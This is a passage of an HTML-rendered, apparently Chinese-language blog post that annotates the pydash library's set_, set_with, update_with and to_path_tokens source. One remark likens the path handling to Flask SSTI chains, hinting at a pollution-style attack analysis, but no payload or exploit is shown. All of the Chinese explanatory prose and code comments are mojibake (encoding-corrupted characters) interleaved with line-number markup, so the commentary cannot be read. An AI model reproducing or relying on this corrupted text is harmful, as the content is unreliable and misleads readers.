class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_</span>(<span class="params">obj, path, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class="line"><span class="string">    it will be created.</span></span><br><span class="line"><span class="string">    è®¾ç½®ç”±â€œpathâ€æè¿°çš„å¯¹è±¡çš„å€¼ã€‚å¦‚æœå¯¹è±¡è·¯å¾„çš„ä»»ä½•éƒ¨åˆ†ä¸å­˜åœ¨ï¼Œå®ƒå°†è¢«åˆ›å»ºã€‚ï¼ˆè¿™é‡Œç¨å¾®æœ‰ç‚¹ç±»ä¼¼äºflaskçš„sstié‡Œé¢æ‰¾é“¾å­çš„æ–¹å¼ã€‚ï¼‰</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.0.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_([1, 2], &#x27;[2][0]&#x27;, 1)</span></span><br><span class="line"><span class="string">        [1, 2, [1]]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b[0].c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 2.2.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 3.3.0</span></span><br><span class="line"><span class="string">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        - Modify `obj` in place.</span></span><br><span class="line"><span class="string">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class="line"><span class="string">          substrings are used.</span></span><br><span class="line"><span class="string">        - Remove alias ``deep_set``.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> set_with(obj, path, value)</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªå‡½æ•°åº•å±‚æ˜¯ä½¿ç”¨çš„ set_with å‡½æ•°ï¼ŒåŒæ—¶ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ¨¡æ¿ï¼Œå°†ç¬¬äºŒä¸ªå‚æ•°é€šè¿‡ç‚¹æ„æˆçš„ç±»ä¼¼é“¾å­çš„ä¸œè¥¿é€’å½’æˆä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ç§å¯¹è±¡ç±»ä¼¼äºç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»å‹ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé‚£ä¹ˆä¹…é€’å½’æˆå­—å…¸çš„å½¢å¼ï¼Œå’Œå®ƒä¸¾çš„ä¾‹å­ç›¸ä¼¼ï¼Œè¿™é‡Œä¹…ä¸è¿›è¡Œæ“ä½œäº†ã€‚</p><p>â€‹ç„¶åæ¥ä¸‹æ¥å°±æ˜¯ set_with å‡½æ•°äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_with</span>(<span class="params">obj, path, value, customizer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`set_` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns undefined path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string">    è¿™ä¸ªæ–¹æ³•ç±»ä¼¼äºï¼šfunc:`set_`ï¼Œé™¤äº†å®ƒæ¥å—å®šåˆ¶å™¨ï¼Œè°ƒç”¨customizerç”Ÿæˆè·¯å¾„çš„å¯¹è±¡ã€‚å¦‚æœcustomizerè¿”å›æœªå®šä¹‰çš„è·¯å¾„ï¼Œåˆ™ç”±è¯¥æ–¹æ³•å¤„ç†è·¯å¾„åˆ›å»º</span></span><br><span class="line"><span class="string">ç›¸åã€‚ä½¿ç”¨ä¸‰ä¸ªå‚æ•°è°ƒç”¨customizerï¼š`ï¼ˆnested_valueã€keyã€nested_objectï¼‰``</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_with(&#123;&#125;, &#x27;[0][1]&#x27;, &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.3.1</span></span><br><span class="line"><span class="string">        Fixed bug where a callable `value` was called when being set.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå‡½æ•°åº•å±‚è°ƒç”¨äº† update_with å‡½æ•°ï¼Œè·Ÿè¿›çœ‹çœ‹ï¼Œè¿™ä¸ªå‡½æ•°ä¸æ˜¯å¾ˆèƒ½ææ‡‚ customizer è¿™ä¸ªå‚æ•°çš„ä½œä¸šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_with</span>(<span class="params">obj, path, updater, customizer=<span class="literal">None</span></span>):  <span class="comment"># noqa: C901</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`update` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns ``None``, path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str|list): A string or list of keys that describe the object path to modify.</span></span><br><span class="line"><span class="string">        updater (callable): Function that returns updated value.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        è¿™ä¸ªæ–¹æ³•ç±»ä¼¼äºï¼šfunc:`update`ï¼Œé™¤äº†å®ƒæ¥å—å®šåˆ¶å™¨ï¼Œè°ƒç”¨å®šåˆ¶å™¨ç”Ÿæˆ</span></span><br><span class="line"><span class="string">è·¯å¾„çš„å¯¹è±¡ã€‚å¦‚æœå®šåˆ¶å™¨è¿”å›â€œNoneâ€ï¼Œåˆ™è·¯å¾„åˆ›å»ºç”±ä»¥ä¸‹æ–¹æ³•å¤„ç†</span></span><br><span class="line"><span class="string">ç›¸åã€‚ä½¿ç”¨ä¸‰ä¸ªå‚æ•°è°ƒç”¨å®šåˆ¶å™¨ï¼šâ€œï¼ˆnested_valueï¼Œkeyï¼Œnested_objectï¼‰â€ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Updated `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; update_with(&#123;&#125;, &#x27;[0][1]&#x27;, lambda: &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">callable</span>(updater):</span><br><span class="line">        updater = pyd.constant(updater)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> customizer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">callable</span>(customizer):</span><br><span class="line">        call_customizer = partial(callit, clone, customizer, argcount=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> customizer:</span><br><span class="line">        call_customizer = partial(callit, customizer, argcount=getargcount(customizer, maxargs=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        call_customizer = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    default_type = <span class="built_in">dict</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">else</span> <span class="built_in">list</span></span><br><span class="line">    <span class="comment">#ä½¿ç”¨ to_path_tokens(path) å°† path è½¬æ¢ä¸ºè·¯å¾„æ ‡è®°çš„åˆ—è¡¨ã€‚</span></span><br><span class="line">    tokens = to_path_tokens(path)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#å¦‚æœè§£æç»“æœä¸æ˜¯åˆ—è¡¨ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸ºå•å…ƒç´ åˆ—è¡¨ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pyd.is_list(tokens):  <span class="comment"># pragma: no cover</span></span><br><span class="line">        tokens = [tokens]</span><br><span class="line"></span><br><span class="line">    last_key = pyd.last(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(last_key, PathToken):</span><br><span class="line">        last_key = last_key.key</span><br><span class="line"></span><br><span class="line">    target = obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">            key = token.key</span><br><span class="line">            default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = token</span><br><span class="line">            default_factory = default_type</span><br><span class="line"></span><br><span class="line">        obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> call_customizer:</span><br><span class="line">            path_obj = call_customizer(obj_val, key, target)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">        base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">                _failed = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _failed:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    value = base_get(target, last_key, default=<span class="literal">None</span>)</span><br><span class="line">    base_set(target, last_key, callit(updater, value))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå…ˆæ”¾ç€è¿™ä¸ªæºç ï¼Œå…ˆè¯»ä¸€ä¸‹ <code>to_path_tokens</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#ç”±äºæˆ‘ä»¬æ— æ³•åˆ¤æ–­ä¸€ä¸ªç©ºæ•°åº”è¯¥æ˜¯å­—å…¸é”®è¿˜æ˜¯åˆ—è¡¨ç´¢å¼•ï¼Œæˆ‘ä»¬</span></span><br><span class="line"><span class="comment">#æ”¯æŒä¸€ç§ç‰¹æ®Šè¯­æ³•ï¼Œå…¶ä¸­ä»»ä½•è¢«æ‹¬å·æ‹¬èµ·æ¥çš„å­—ç¬¦ä¸²æ•´æ•°éƒ½è¢«è§†ä¸º</span></span><br><span class="line"><span class="comment">#åˆ—è¡¨ç´¢å¼•å¹¶è½¬æ¢ä¸ºæ•´æ•°ã€‚</span></span><br><span class="line">        keys = [ <span class="comment">#ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ RE_PATH_KEY_DELIMæ¥åˆ†å‰²å­—ç¬¦ä¸²ã€‚åˆ†å‰²åï¼Œå¯¹äºæ¯ä¸ªéƒ¨åˆ†ï¼ˆkeyï¼‰ï¼Œä¼šè¿›ä¸€æ­¥æ£€æŸ¥ï¼š</span></span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="comment">#å¦‚æœ key åŒ¹é… RE_PATH_LIST_INDEXï¼Œåˆ™å°†è¯¥éƒ¨åˆ†è§†ä¸ºåˆ—è¡¨ç´¢å¼•ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª PathToken å¯¹è±¡ï¼Œå…¶é”®ä¸ºè½¬æ¢åçš„æ•´æ•°ç´¢å¼•ï¼Œé»˜è®¤å€¼ç”Ÿæˆå™¨ä¸º listã€‚</span></span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#å¦‚æœ key ä¸åŒ¹é… RE_PATH_LIST_INDEXï¼Œåˆ™å°†å…¶è§†ä¸ºå­—å…¸é”®ï¼Œå¹¶é€šè¿‡ unescape_path_keyï¼ˆæœªåœ¨ä»£ç æ®µä¸­å®šä¹‰ï¼Œä½†æˆ‘ä»¬å¯ä»¥å‡è®¾å®ƒç”¨äºå¤„ç†å¯èƒ½çš„è½¬ä¹‰å­—ç¬¦ï¼‰å‡½æ•°å¤„ç†åï¼Œåˆ›å»ºä¸€ä¸ª PathToken å¯¹è±¡ï¼Œå…¶é”®ä¸ºå¤„ç†åçš„å­—ç¬¦ä¸²ï¼Œé»˜è®¤å€¼ç”Ÿæˆå™¨ä¸º dictã€‚</span></span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="comment">#å¦‚æœ value æ˜¯ UNSETåˆ™è¿”å›ä¸€ä¸ªç©ºçš„ PathToken åˆ—è¡¨ã€‚</span></span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="comment">#å¦‚æœ value ä¸æ˜¯ä¸Šè¿°ä»»ä½•ä¸€ç§æƒ…å†µï¼ˆå³å®ƒå¯èƒ½å·²ç»æ˜¯ä¸€ä¸ªåˆ—è¡¨æˆ–ç±»ä¼¼ç»“æ„ï¼‰ï¼Œåˆ™ç›´æ¥è¿”å› valueï¼ˆå°½ç®¡è¿™é‡Œå¯èƒ½å­˜åœ¨ä¸€ä¸ªç±»å‹ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå› ä¸ºé€šå¸¸æˆ‘ä»¬æœŸæœ›è¿”å›çš„æ˜¯ PathToken å¯¹è±¡çš„åˆ—è¡¨ï¼Œè€Œä¸æ˜¯åŸå§‹å€¼ï¼‰ã€‚ç„¶è€Œï¼ŒåŸºäºå‡½æ•°çš„å‘½åå’Œæè¿°ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªé”™è¯¯æˆ–ç‰¹æ®Šæƒ…å†µçš„å¤„ç†æ–¹å¼ã€‚</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> keys</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæ¯”è¾ƒé‡è¦ï¼Œåˆ†æä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#éå†pathå¹¶æ›´æ–°å¯¹è±¡</span></span><br><span class="line"><span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):<span class="comment">#è¿™è¡Œä»£ç ä½¿ç”¨enumerateå‡½æ•°éå†tokensåˆ—è¡¨ï¼Œä½†é€šè¿‡pyd.initialå‡½æ•°æ¥è·å–é™¤äº†æœ€åä¸€ä¸ªå…ƒç´ ä¹‹å¤–çš„æ‰€æœ‰å…ƒç´ ã€‚è¿™æ„å‘³ç€éå†å°†è·³è¿‡tokensåˆ—è¡¨çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#è¿™é‡Œæ£€æŸ¥å½“å‰éå†åˆ°çš„tokenæ˜¯å¦æ˜¯PathTokenç±»çš„å®ä¾‹ã€‚å¦‚æœæ˜¯ï¼Œåˆ™ä»tokenä¸­æå–keyå€¼ï¼Œå¹¶å°è¯•ä»tokensä¸­è·å–ä¸‹ä¸€ä¸ªå…ƒç´ çš„default_factoryã€‚å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨default_typeä½œä¸ºé»˜è®¤å€¼ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">        key = token.key</span><br><span class="line">        default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#å¦‚æœtokenä¸æ˜¯PathTokenç±»çš„å®ä¾‹ï¼Œåˆ™ç›´æ¥å°†tokenä½œä¸ºkeyï¼Œå¹¶å°†default_factoryè®¾ç½®ä¸ºdefault_typeã€‚</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = token</span><br><span class="line">        default_factory = default_type</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="comment">#ä½¿ç”¨base_getå‡½æ•°å°è¯•ä»targetå¯¹è±¡ä¸­è·å–keyå¯¹åº”çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™é»˜è®¤ä¸ºNoneã€‚åŒæ—¶ï¼Œå°†path_objåˆå§‹åŒ–ä¸ºNoneã€‚</span></span><br><span class="line">    obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">    path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#å¦‚æœcall_customizerä¸ºçœŸï¼ˆå‡è®¾æ˜¯ä¸€ä¸ªå‡½æ•°ï¼‰ï¼Œåˆ™è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¹¶ä¼ å…¥å½“å‰å€¼obj_valã€é”®keyå’Œç›®æ ‡å¯¹è±¡targetï¼Œç»“æœèµ‹å€¼ç»™path_objã€‚</span></span><br><span class="line">    <span class="keyword">if</span> call_customizer:</span><br><span class="line">        path_obj = call_customizer(obj_val, key, target)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#å¦‚æœpath_objä»ç„¶æ˜¯Noneï¼Œåˆ™è°ƒç”¨default_factoryæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™path_objã€‚</span></span><br><span class="line">    <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#ä½¿ç”¨base_setå‡½æ•°å°†path_objè®¾ç½®åˆ°targetå¯¹è±¡çš„keyä½ç½®ä¸Šï¼Œä¸”ä¸å…è®¸è¦†ç›–</span></span><br><span class="line">    base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#å°è¯•é‡æ–°è·å–targetå¯¹è±¡ä¸­keyå¯¹åº”çš„å€¼ï¼Œå¦‚æœå¤±è´¥ï¼Œä¼šæ•è·TypeErrorã€‚åœ¨æ•è·å¼‚å¸¸çš„å¤„ç†ä¸­ï¼Œå°è¯•å°†keyä½œä¸ºç´¢å¼•æ¥ç›´æ¥ä»targetä¸­è·å–å…ƒç´ ã€‚å¦‚æœè¿™ä¹Ÿå¤±è´¥ï¼Œåˆ™æ ‡è®°ä¸ºå¤±è´¥ï¼ˆ_failed = Trueï¼‰å¹¶æŠ›å‡ºä¸€ä¸ªåŒ…å«åŸå§‹å¼‚å¸¸ä¿¡æ¯çš„TypeErrorã€‚</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no 